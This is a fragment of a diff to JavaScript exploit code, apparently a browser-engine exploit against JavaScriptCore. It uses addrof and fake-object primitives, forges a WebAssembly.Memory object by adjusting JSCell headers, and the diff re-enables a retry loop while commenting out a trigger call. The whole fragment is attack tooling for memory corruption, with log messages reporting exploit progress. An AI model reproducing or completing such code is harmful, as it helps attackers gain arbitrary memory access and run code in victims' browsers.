@@ -239,7 +239,7 @@ function foo(obj) {
    return delete obj['x'];
  }
 // noInline(foo);
-foo(null);
+//foo(null);
 
   let o = {};
 
@@ -315,7 +315,7 @@ foo(null);
         
         var realWasmMem = new WebAssembly.Memory({inital: 0x1});
         sleep(5);
-        var wasmBufferRawAddr = addrof2(wasmBuffer);   
+        var wasmBufferRawAddr = addrof2(wasmBuffer);
         if (wasmBufferRawAddr == 0x7ff8000000000000) {
             //log("[+] Got A NAN address which invalid reloading");
             fail("[+] Got A NAN address which is invalid ... reloading");
@@ -324,7 +324,7 @@ foo(null);
         let u = new Int64(wasmBufferRawAddr).toString()[9];
         var fakeWasmBuffer = fake_obj_at_address(wasmBufferRawAddr+16,parseInt(u));
         var maxtry = 0;
-        /*
+        
         if (!(fakeWasmBuffer instanceof WebAssembly.Memory)) {
         while (!(fakeWasmBuffer instanceof WebAssembly.Memory)) {
             jsCellHeader.assignAdd(jsCellHeader, Int64.One);
@@ -336,8 +336,8 @@ foo(null);
         }
     } else {
         log('[+] Successfully got fakeobj as WASMObject');
-    }*/
-        log('[+] Successfully got fakeobj as WASMObject');
+    }
+        //log('[+] Successfully got fakeobj as WASMObject');
         var wasmMemRawAddr = __addrof(wasmInternalMemory);
         var wasmMem = fake_obj_at_address2(wasmMemRawAddr+16,parseInt(u));    
         
